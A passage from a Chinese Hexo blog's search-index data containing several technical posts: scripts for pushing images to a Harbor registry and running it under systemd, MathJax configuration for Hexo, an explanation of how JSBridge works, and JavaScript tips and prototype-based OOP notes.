is pushing...&quot; &gt;&amp; 2</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    echo docker tag $src_image $dst_image</span></span><br><span class=\"line\"><span class=\"string\">    echo docker push $dst_image</span></span><br><span class=\"line\"><span class=\"string\">    echo docker rmi $dst_image</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    count=$(($count + 1))</span></span><br><span class=\"line\"><span class=\"string\">done</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+x harbor-push.sh</span><br><span class=\"line\">docker images |<span class=\"built_in\">tail</span> -n +2 |./harbor-push.sh </span><br></pre></td></tr></table></figure>\n</code></pre>\n<h3 id=\"手工启动和停止Harbor的操作方法\"><a href=\"#手工启动和停止Harbor的操作方法\" class=\"headerlink\" title=\"手工启动和停止Harbor的操作方法\"></a>手工启动和停止Harbor的操作方法</h3><p>由于Harbor是采用docker-compose方式启动的，因此关机之前最好手工停止服务，输入：</p>\n<p><code>cd /root/harbor &amp;&amp; docker-compose down</code></p>\n<p>开机后，启动Harbor服务的方式也类似，执行命令:</p>\n<p><code>cd /root/harbor &amp;&amp; docker-compose up -d --build</code></p>\n<h3 id=\"通过Systemd设置Harbor开机自启动\"><a href=\"#通过Systemd设置Harbor开机自启动\" class=\"headerlink\" title=\"通过Systemd设置Harbor开机自启动\"></a>通过Systemd设置Harbor开机自启动</h3><pre><code><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat &gt; /etc/systemd/system/harbor.service &lt;&lt; EOF</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Harbor</span><br><span class=\"line\">After=docker.service systemd-networkd.service systemd-resolved.service</span><br><span class=\"line\">Requires=docker.service</span><br><span class=\"line\">Documentation=http://github.com/vmware/harbor</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">RestartSec=5</span><br><span class=\"line\">ExecStart=/usr/bin/docker-compose -f /root/harbor/docker-compose.yml up</span><br><span class=\"line\">ExecStop=/usr/bin/docker-compose -f /root/harbor/docker-compose.yml down</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重载Systemd并设置Harbor自启动</span></span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl enable harbor</span><br><span class=\"line\">systemctl status harbor</span><br></pre></td></tr></table></figure>\n</code></pre>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://github.com/goharbor/harbor\">Harbor的官方网站</a></li>\n<li><a href=\"https://github.com/AliyunContainerService/image-syncer/blob/master/README-zh_CN.md\">Image-syncer：阿里云提供的另一个镜像同步工具</a></li>\n<li><a href=\"https://blog.csdn.net/hxpjava1/article/details/79308890\">很全面的Harbor系统集成方法</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_33736048/article/details/92953567?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.nonecase\">Harbor与Nginx的集成中发现的问题</a></li>\n</ul>\n"},{"title":"Hexo 支持 LaTeX 数学公式","url":"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/","content":"<p>LaTex 是一个创建专业文档的工具，在各类科学文献中得到了广泛的使用。它不仅可以创建出有着漂亮排版的文档，还可以让用户非常方便的处理排版中非常复杂的一些问题，例如输入数学公式、创建表格、引用、参考文献，以及全文统一的格式。<br>LaTeX 是一种排版语言，并非所见即所得，而是基于 What You See Is What You Mean 的理念，用户需要输入特定的代码，保存在后缀为<code>.tex</code>的文件中，通过编译得到所需的pdf文件。</p>\n<h2 id=\"配置方法\"><a href=\"#配置方法\" class=\"headerlink\" title=\"配置方法\"></a>配置方法</h2><p>Hexo博客中支持复杂数学公式的渲染，MathJax 和 KaTeX 是两个常见的渲染引擎。</p>\n<p>MathJax是一个开源JavaScript库。它支持<strong>LaTeX</strong>、MathML、AsciiMath符号，可以运行于所有流行浏览器上。MathJax使用网络字体（大部分浏览器都支持）去产生高质量的排版，使其在所有分辨率都可缩放和显示。使用MathJax显示数学公式是基于文本的，而非图片，因此可以被搜索引擎使用。<br>MathJax 使用者多、兼容性好、但渲染速度慢；KaTeX渲染速度快，且根号无错位，但时有bug。</p>\n<p><code>_config.next.yml</code>的配置实例：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">math:</span></span><br><span class=\"line\">  <span class=\"comment\"># Default (false) will load mathjax / katex script on demand.</span></span><br><span class=\"line\">  <span class=\"comment\"># That is it only render those page which has `mathjax: true` in front-matter.</span></span><br><span class=\"line\">  <span class=\"comment\"># If you set it to true, it will load mathjax / katex script EVERY PAGE.</span></span><br><span class=\"line\">  <span class=\"attr\">every_page:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">mathjax:</span></span><br><span class=\"line\">    <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"comment\"># Available values: none | ams | all</span></span><br><span class=\"line\">    <span class=\"attr\">tags:</span> <span class=\"string\">none</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">katex:</span></span><br><span class=\"line\">    <span class=\"attr\">enable:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"comment\"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class=\"line\">    <span class=\"attr\">copy_tex:</span> <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h2><p>行内公式：放在文字中间的公式，用一对<code>$</code>包括起来。<br>行间公式：公式独立成行，也叫独立公式，用一对<code>$$</code>。</p>\n<p><code>^</code> ：上标，<code>_</code> ：下标。<br>如果上下标的内容多于一个字符，需要用一对<code>&#123;&#125;</code> 将这些内容括成一个整体。<br>上下标可以嵌套，也可以同时使用。</p>\n<p>公式对齐：<br>使用形如<code>\\begin&#123;align&#125;...\\end&#123;align&#125;</code>的格式，其中需要使用<code>&amp;</code>来指示需要对齐的位置。</p>\n<h2 id=\"常用表达式\"><a href=\"#常用表达式\" class=\"headerlink\" title=\"常用表达式\"></a>常用表达式</h2><p>罗马字母<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/letters.png\" alt=\"罗马字母表\"></p>\n<p>运算符<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/symbols-1.png\" alt=\"数学符号1\"></p>\n<p>关系符<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/relations.png\" alt=\"关系\"></p>\n<p>箭头符号<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/arrows.png\" alt=\"arrow\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://katex.org/docs/supported.html\">LaTeX 语法 - 官方</a></li>\n<li><a href=\"https://blog.csdn.net/wzk4869/article/details/126863936\">KaTeX 的中文简明语法</a></li>\n<li><a href=\"https://mathjax-chinese-doc.readthedocs.io/en/latest/index.html#\">MathJax 中文文档 - 官方</a></li>\n<li><a href=\"https://bachzart.github.io/2020/09/17/MathJax-%E8%AF%AD%E6%B3%95%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8D%97/\">MathJax 语法快速指南</a></li>\n<li><a href=\"https://blog.csdn.net/xm_ovo/article/details/107536132\">解决mathjax公式不换行问题</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"Latex%E9%80%9F%E6%9F%A5.pdf\">Latex 速查手册</a></li>\n<li><a href=\"GB-3102.11-1993.pdf\">国家标准 GB 3102.11-1993 物理科学和技术中使用的数学符号</a></li>\n</ul>\n"},{"title":"JSBridge技术原理分析","url":"/2021/02/12/JSBridge%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/","content":"<h2 id=\"JSBridge的起源\"><a href=\"#JSBridge的起源\" class=\"headerlink\" title=\"JSBridge的起源\"></a>JSBridge的起源</h2><p><code>PhoneGap</code>（Codova 的前身）作为 Hybrid 鼻祖框架，是一个开源的移动开发框架，允许你用标准的web技术-HTML5,CSS3和JavaScript做跨平台的Hybird WebUI开发，应该是最先被开发者广泛认知的 JSBridge 的应用场景。而对于 JSBridge 的应用在国内真正兴盛起来，则是因为杀手级应用微信的出现。</p>\n<p>JSBridge 是一种JS 实现的Bridge，连接着桥两端的 Native 和 H5。 简单来讲，它在APP 内方便地让Native 调用JS，JS 调用Native ，是双向通信的通道。 JSBridge 主要提供了JS 调用Native 代码的能力，实现原生功能如查看本地相册、打开摄像头、指纹支付等。</p>\n<img src=\"/2021/02/12/JSBridge%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/jsbridge.png\" class=\"\">\n\n<p>既然是『简单来讲』，那么 JSBridge 的用途肯定不只『调用 Native 功能』这么简单宽泛。实际上，JSBridge 就像其名称中的『Bridge』的意义一样，是 Native 和非 Native 之间的桥梁，它的核心是 构建 Native 和非 Native 间消息通信的通道，而且是双向通信的通道。</p>\n<blockquote>\n<p>微信、头条等小程序基于 Web UI，但是为了追求运行效率，对 UI 展现逻辑和业务逻辑的 JavaScript 进行了隔离。</p>\n</blockquote>\n<h2 id=\"JSBridge的实现原理\"><a href=\"#JSBridge的实现原理\" class=\"headerlink\" title=\"JSBridge的实现原理\"></a>JSBridge的实现原理</h2><p>JavaScript 是运行在一个单独的 JS Context 中（例如，WebView 的 Webkit 引擎、JSCore）。由于这些 Context 与原生运行环境的天然隔离，我们可以将这种情况与 RPC（Remote Procedure Call，远程过程调用）通信进行类比，将 Native 与 JavaScript 的每次互相调用看做一次 RPC 调用。</p>\n<p>在 JSBridge 的设计中，可以把前端看做 RPC 的客户端，把 Native 端看做 RPC 的服务器端，从而 JSBridge 要实现的主要逻辑就出现了：通信调用（Native 与 JS 通信） 和 句柄解析调用。（如果你是个前端，而且并不熟悉 RPC 的话，你也可以把这个流程类比成 JSONP 的流程）</p>\n<p>通过以上的分析，可以清楚地知晓 JSBridge 主要的功能和职责，接下来就以 Hybrid 方案 为案例从这几点来剖析 JSBridge 的实现原理。</p>\n<h3 id=\"JS-调用-Native\"><a href=\"#JS-调用-Native\" class=\"headerlink\" title=\"JS 调用 Native\"></a>JS 调用 Native</h3><p>Hybrid 方案是基于 WebView 的，JavaScript 执行在 WebView 的 Webkit 引擎中。因此，Hybrid 方案中 JSBridge 的通信原理会具有一些 Web 特性。</p>\n<h4 id=\"方式1：注入API\"><a href=\"#方式1：注入API\" class=\"headerlink\" title=\"方式1：注入API\"></a>方式1：注入API</h4><p>对于 iOS来说，</p>\n<ul>\n<li>UIWebView提供了<code>JavaScriptScore</code>方法，支持 iOS 7.0 及以上系统</li>\n<li>WKWebview提供了 <code>window.webkit.messageHandlers</code> 方法，支持 iOS 8.0 及以上系统。</li>\n</ul>\n<p>对于Andriod来说，</p>\n<ul>\n<li>4.2 之前，Android 注入 JavaScript 对象的接口是 <code>addJavascriptInterface</code>，但是这个接口有漏洞，可以被不法分子利用，危害用户的安全，</li>\n<li>4.2 之后，Android引入新的接口 <code>@JavascriptInterface</code>以解决安全问题,所以 Android 注入对对象的方式是有兼容性问题的。</li>\n</ul>\n<h4 id=\"方式2：拦截-URL-SCHEME\"><a href=\"#方式2：拦截-URL-SCHEME\" class=\"headerlink\" title=\"方式2：拦截 URL SCHEME\"></a>方式2：拦截 URL SCHEME</h4><p><code>URL SCHEME</code>是一种类似于url的链接，是为了方便app直接互相调用设计的，形式和普通的 url 近似，主要区别是 protocol 和 host 一般是自定义的，例如: <code>qunarhy://hy/url?url=ymfe.tech</code>，protocol 是 qunarhy，host 则是 hy。</p>\n<p>拦截 URL SCHEME 的主要流程是：Web 端通过某种方式（例如 iframe.src）发送 URL Scheme 请求，之后 Native 拦截到请求并根据 URL SCHEME（包括所带的参数）进行相关操作。</p>\n<p>在实践过程中，这种方式有一定的缺陷：</p>\n<ol>\n<li>使用 iframe.src 发送 URL SCHEME 会有 url 长度的隐患。</li>\n<li>创建请求，需要一定的耗时，比注入 API 的方式调用同样的功能，耗时会较长。</li>\n</ol>\n<p>但是这种方式的最重要优势是跨平台兼容性，尤其是<strong>支持 iOS6</strong>，但考虑到终端覆盖率，已经不是主流方式。</p>\n<h4 id=\"方式3：重写-prompt-等原生-JS-方法\"><a href=\"#方式3：重写-prompt-等原生-JS-方法\" class=\"headerlink\" title=\"方式3：重写 prompt 等原生 JS 方法\"></a>方式3：重写 prompt 等原生 JS 方法</h4><p>WebView有一个方法，叫<code>setWebChromeClient</code>，可以设置<code>WebChromeClient</code>对象，而这个对象中有三个方法，分别是<code>onJsAlert</code>,<code>onJsConfirm</code>,<code>onJsPrompt</code>，当js调用window对象的对应的方法，即<code>window.alert</code>，<code>window.confirm</code>，<code>window.prompt</code>，WebChromeClient对象中的三个方法对应的就会被触发，我们是不是可以利用这个机制，自己做一些处理呢？答案是肯定的。</p>\n<p>由于拦截上述方法会对性能造成一定影响，因此需要选择使用频率较低的方法，而在Android中，相比其它几个方法，几乎不会使用到<code>prompt</code>方法，因此占用<code>prompt</code>是最佳方案。</p>\n<h3 id=\"Native-调用-JS\"><a href=\"#Native-调用-JS\" class=\"headerlink\" title=\"Native 调用 JS\"></a>Native 调用 JS</h3><p>Native 调用 JS 比较简单，只要 H5 将 JS 方法暴露在 Window 上给 Native 调用即可。</p>\n<p>Android 中主要有两种方式实现。</p>\n<ul>\n<li>在 4.4 以前，通过 <code>loadUrl</code> 方法，执行一段 JS 代码来实现。<br>  loadUrl 方法使用起来方便简洁，但是效率低无法获得返回结果且调用的时候会刷新 WebView 。</li>\n<li>在 4.4 以后，可以使用 <code>evaluateJavascript</code> 方法实现。<br>  该方法效率高获取返回值方便，调用时候不刷新 WebView，但是只支持 Android 4.4+。</li>\n</ul>\n<h2 id=\"JSBridge-如何引用\"><a href=\"#JSBridge-如何引用\" class=\"headerlink\" title=\"JSBridge 如何引用\"></a>JSBridge 如何引用</h2><p>对于 JSBridge 的引用，常用有两种方式，各有利弊。</p>\n<h3 id=\"方式1：由-Native-端进行注入\"><a href=\"#方式1：由-Native-端进行注入\" class=\"headerlink\" title=\"方式1：由 Native 端进行注入\"></a>方式1：由 Native 端进行注入</h3><p>注入方式和 Native 调用 JavaScript 类似，直接执行桥的全部代码。</p>\n<p>它的优点在于：桥的版本很容易与 Native 保持一致，Native 端不用对不同版本的 JSBridge 进行兼容；</p>\n<p>它的缺点是：注入时机不确定，需要实现注入失败后重试的机制，保证注入的成功率，同时 JavaScript 端在调用接口时，需要优先判断 JSBridge 是否已经注入成功。</p>\n<h3 id=\"方式2：由-JavaScript-端引用\"><a href=\"#方式2：由-JavaScript-端引用\" class=\"headerlink\" title=\"方式2：由 JavaScript 端引用\"></a>方式2：由 JavaScript 端引用</h3><p>与由 Native 端注入正好相反，它的优点在于：JavaScript 端可以确定 JSBridge 的存在，直接调用即可；</p>\n<p>缺点是：如果桥的实现方式有更改，JSBridge 需要兼容多版本的 Native Bridge 或者 Native Bridge 兼容多版本的 JSBridge。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://juejin.cn/post/6844903585268891662\">JSBridge原理的最佳教材</a></li>\n<li><a href=\"https://www.zoo.team/article/jsbridge\">小白必看，JSBridge 初探</a></li>\n<li><a href=\"https://developers.weixin.qq.com/community/develop/doc/d1421cd729a51548672430e544c458b2\">微信小程序weapp的底层实现原理</a></li>\n<li><a href=\"https://blog.csdn.net/sbsujjbcy/article/details/50752595\">Android JSBridge的原理与实现</a></li>\n<li><a href=\"https://www.zhihu.com/column/p/32146189\">Android安全开发之WebView中的地雷</a></li>\n</ul>\n"},{"title":"JavaScript 开发经验点滴","url":"/2022/05/05/JavaScript-%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C%E7%82%B9%E6%BB%B4/","content":"<h2 id=\"一、常用资料\"><a href=\"#一、常用资料\" class=\"headerlink\" title=\"一、常用资料\"></a>一、常用资料</h2><ul>\n<li><a href=\"https://www.runoob.com/js/js-class-intro.html\">JavaScript - 菜鸟课堂</a></li>\n<li><a href=\"https://es6.ruanyifeng.com/#docs/class\">ECMAScript 6 入门 - 阮一峰</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/1022910821149312\">JavaScript教程 - 廖雪峰</a></li>\n<li><a href=\"https://www.w3school.com.cn/jsref/index.asp\">HTML DOM 参考手册 - W3School</a></li>\n</ul>\n<h2 id=\"二、有用技巧\"><a href=\"#二、有用技巧\" class=\"headerlink\" title=\"二、有用技巧\"></a>二、有用技巧</h2><h3 id=\"1-如何获得唯一标识符（UID）\"><a href=\"#1-如何获得唯一标识符（UID）\" class=\"headerlink\" title=\"1. 如何获得唯一标识符（UID）\"></a>1. 如何获得唯一标识符（UID）</h3><p>利用toString(36)，将一个数字转换为36进制，也就是10个数字+26个字母<br><code>uid = Number(Math.random().toString().split(&#39;.&#39;)[1]).toString(36);</code></p>\n<h3 id=\"2-localStorage采用-k-v-格式，仅支持字符串格式，怎么存储对象格式？\"><a href=\"#2-localStorage采用-k-v-格式，仅支持字符串格式，怎么存储对象格式？\" class=\"headerlink\" title=\"2. localStorage采用[k,v]格式，仅支持字符串格式，怎么存储对象格式？\"></a>2. localStorage采用[k,v]格式，仅支持字符串格式，怎么存储对象格式？</h3><ul>\n<li>存储：通过<code>JSON.stringify()</code>转换为序列号字符串；</li>\n<li>读取：通过<code>JSON.parse()</code>恢复为Object或任何其它数据类型</li>\n</ul>\n<h3 id=\"3-一元运算符加法-一元运算符减法\"><a href=\"#3-一元运算符加法-一元运算符减法\" class=\"headerlink\" title=\"3. 一元运算符加法 &amp; 一元运算符减法\"></a>3. 一元运算符加法 &amp; 一元运算符减法</h3><p>一元加法本质上对数字无任何影响，但对字符串却有有趣的效果，会把字符串转换成数字。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> iNum = <span class=\"number\">20</span>;</span><br><span class=\"line\">iNum = +iNum;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(iNum);            <span class=\"comment\">//输出 &quot;20&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> sNum = <span class=\"string\">&quot;20&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(<span class=\"keyword\">typeof</span> sNum);     <span class=\"comment\">//输出 &quot;string&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iNum = +sNum;</span><br><span class=\"line\"><span class=\"title function_\">alert</span>(<span class=\"keyword\">typeof</span> iNum);     <span class=\"comment\">//输出 &quot;number&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>类似的，一元减法就是对数值求负（例如，20 转换成 -20），或者将把字符串转换成近似的数字，并对该值求负（例如，字符串 “-20” 转换成 -20）。</p>\n<blockquote>\n<p>注意：一元运算符默认仅支持十进制，仅对以 “0x” 开头的字符串（表示十六进制数字），一元运算符才能把它转换成十进制的值（例如 “0xB” 将被转换成 11）</p>\n</blockquote>\n<p>请参考示例：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 不同于标准的isNaN(), Number.isNaN()不会默认进行的类型转换</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title class_\">Number</span>.<span class=\"built_in\">isNaN</span>(+<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">timeout</span>) || <span class=\"title class_\">Number</span>.<span class=\"built_in\">isNaN</span>(+<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">retry</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Error</span>(<span class=\"string\">`PxerThread#init: <span class=\"subst\">$&#123;<span class=\"variable language_\">this</span>.id&#125;</span> config illegal`</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-关于实例方法和原型方法（Todo）\"><a href=\"#4-关于实例方法和原型方法（Todo）\" class=\"headerlink\" title=\"4. 关于实例方法和原型方法（Todo）\"></a>4. 关于实例方法和原型方法（Todo）</h3><h3 id=\"5-关于apply、call和bind\"><a href=\"#5-关于apply、call和bind\" class=\"headerlink\" title=\"5. 关于apply、call和bind\"></a>5. 关于apply、call和bind</h3><h2 id=\"三、经验之谈\"><a href=\"#三、经验之谈\" class=\"headerlink\" title=\"三、经验之谈\"></a>三、经验之谈</h2><ul>\n<li>javascript<strong>不支持</strong>同名方法的重载，因为它是一种弱类型的编程语言</li>\n<li>关于Class，如果在一个方法前加上<code>static</code>关键字，就表示该方法不会被实例继承，而是直接通过类来调用，这就称为“静态方法”。<br>  ES6明确规定，Class内部只有静态方法，没有静态属性(指Class本身的属性，即Class.propName，而不是定义在实例对象（this）上的属性)</li>\n</ul>\n<hr>\n<h2 id=\"四、参考文献\"><a href=\"#四、参考文献\" class=\"headerlink\" title=\"四、参考文献\"></a>四、参考文献</h2><ul>\n<li><a href=\"https://blog.csdn.net/PY0312/article/details/103570989\">JS存储对象 localStorage 使用必知必会</a></li>\n<li><a href=\"https://www.w3school.com.cn/js/pro_js_operators_unary.asp\">ECMAScript 一元运算符</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018884605\">ES6系列之class</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000018270750\">JS中的call、apply、bind方法详解</a></li>\n<li><a href=\"https://github.com/Lucifier129/Lucifier129.github.io/issues/7\">在 JavaScript 中用匿名函数（箭头函数）写出递归的方法</a></li>\n<li><a href=\"https://keenwon.com/1524.html\">ES5 和 ES6 中的继承</a></li>\n</ul>\n"},{"title":"JavaScript技术分析之一：面向对象编程","url":"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","content":"<h2 id=\"一、面向对象编程（Object-oriented-programming）\"><a href=\"#一、面向对象编程（Object-oriented-programming）\" class=\"headerlink\" title=\"一、面向对象编程（Object-oriented programming）\"></a>一、面向对象编程（Object-oriented programming）</h2><p>对于面向对象的 OOP 编程语言，最基本的概念就是是：类、实例、对象。</p>\n<ul>\n<li>Class - 类是对象的类型模板<br>  类是抽象的，而不是其所描述的对象集合中的任何特定的个体。<br>  类定义了某一对象集合所具有的共同特征，包含了存储数据的结构（Attribute属性）和操纵数据的行为（Method方法）</li>\n<li>Instance - 实例是根据类创建的对象<br>  对象就是实例，是一个类的实例化。例如， Victoria 是 Employee 类的一个实例，表示一个特定的雇员个体。<br>  实例具有和其父类完全一致的属性，不多也不少。</li>\n</ul>\n<h3 id=\"基于类的OOP语言\"><a href=\"#基于类的OOP语言\" class=\"headerlink\" title=\"基于类的OOP语言\"></a>基于类的OOP语言</h3><p>大多数的OOP编程语言采用基于类（class-based）的模式，也称为经典模式，包括Java、Python、C++等，例如Java的开发过程完全基于Class，每个jar包就是一个完整的类定义，其核心理念是：</p>\n<ul>\n<li>强调类和实例是两种完全不同的实体，通过类来描述实例对象应该具有哪些状态和行为</li>\n<li>类是一个模板，对象是一个实例，必须首先定义类，然后才能根据模板完成相应对象的创建工作</li>\n<li>类与类之间形成了继承、组合等关系</li>\n</ul>\n<h3 id=\"基于原型的OOP语言\"><a href=\"#基于原型的OOP语言\" class=\"headerlink\" title=\"基于原型的OOP语言\"></a>基于原型的OOP语言</h3><p>然而，少数语言坚持采用基于原型（prototype-based）的模式，主要是JavaScript、Lua、Perl等，不区分类和实例的概念，而是通过原型（prototype）来实现面向对象编程。其强调程序员应关注一系列对象实例的行为，并将这些对象划分为使用方式相似的原型对象，而不是努力去将实体抽象为难以理解的Class。</p>\n<ul>\n<li>强调原型对象(prototypical object)，即不是根据“模板”，而是通过“复制”一个已经存在的对象（原型）来创建另一个新对象</li>\n<li>任何对象都可以作为另一个对象的原型，从而允许后者共享前者的属性，但只允许单继承</li>\n<li>强调动态属性和方法，任何对象都可以指定其自身的属性，既可以是创建时也可以在运行时修改</li>\n</ul>\n<h3 id=\"对比分析\"><a href=\"#对比分析\" class=\"headerlink\" title=\"对比分析\"></a>对比分析</h3><table>\n<thead>\n<tr>\n<th>基于类的（Java）</th>\n<th>基于原型的（JavaScript）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>类和实例是不同的实体,通过类定义来定义类，通过构造器方法来实例化类</td>\n<td>所有对象都是实例，无需单独的类定义，通过构造器函数来定义和创建一组对象</td>\n</tr>\n<tr>\n<td>通过类定义来定义现存类的子类，从而构建对象的层级结构</td>\n<td>指定一个对象作为原型，并且与构造函数一起构建对象的层级结构</td>\n</tr>\n<tr>\n<td>支持多重继承，遵循<strong>类链</strong>继承属性</td>\n<td>仅支持单继承，遵循<strong>原型链</strong>继承属性</td>\n</tr>\n<tr>\n<td>类定义指定类的所有实例的所有属性，不允许运行时动态添加属性</td>\n<td>构造器函数或原型指定实例的初始属性集，允许动态地向单个对象或者整个对象集中添加或移除属性</td>\n</tr>\n<tr>\n<td>通过<code>new</code>操作符创建单个对象</td>\n<td>相同</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、原型链的实现原理\"><a href=\"#二、原型链的实现原理\" class=\"headerlink\" title=\"二、原型链的实现原理\"></a>二、原型链的实现原理</h2><p>早期的JavaScript支持<code>Object</code>对象，但根本没有类的概念，也不支持<code>Class</code>关键字，实现类定义的唯一途径就是通过函数来<strong>模拟</strong>实现。<br>以ECMAScript 5为例，定义一个类就等同于定义一个构造函数，实现继承关系就是把一个对象(函数)的原型指向另一个对象(函数)，依次延展从而构成一条原型链。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义Person类的构造函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Person</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 实例属性</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name</span><br><span class=\"line\">  <span class=\"comment\">// 实例方法</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">sayName</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable language_\">this</span>.<span class=\"property\">name</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;xyf1&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&#x27;xyf2&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(person1.<span class=\"property\">constructor</span> === <span class=\"title class_\">Person</span>)</span><br></pre></td></tr></table></figure>\n\n<p>实现原型链继承的关键是<code>__proto__</code>（隐式原型）和 <code>[[prototype]]</code>（显示原型）,JavaScript正是通过两者的合作实现了原型链，以及对象的继承。</p>\n<blockquote>\n<p>Every JavaScript object has a second JavaScript object (or null ,but this is rare) associated with it.<br>This second object is known as a prototype, and the first object inherits properties from the prototype.</p>\n</blockquote>\n<h3 id=\"隐式原型：-proto\"><a href=\"#隐式原型：-proto\" class=\"headerlink\" title=\"隐式原型：__proto__\"></a>隐式原型：<code>__proto__</code></h3><ul>\n<li>每个对象都有的一个属性，指向当前对象的原型对象</li>\n<li>当访问一个对象的属性时，如果对象内部不存在该属性，那么就通过<code>__proto__</code>去原型对象中寻找该属性，并一直循环下去，这就是<strong>原型链</strong>的概念</li>\n</ul>\n<h3 id=\"显式原型：-prototype\"><a href=\"#显式原型：-prototype\" class=\"headerlink\" 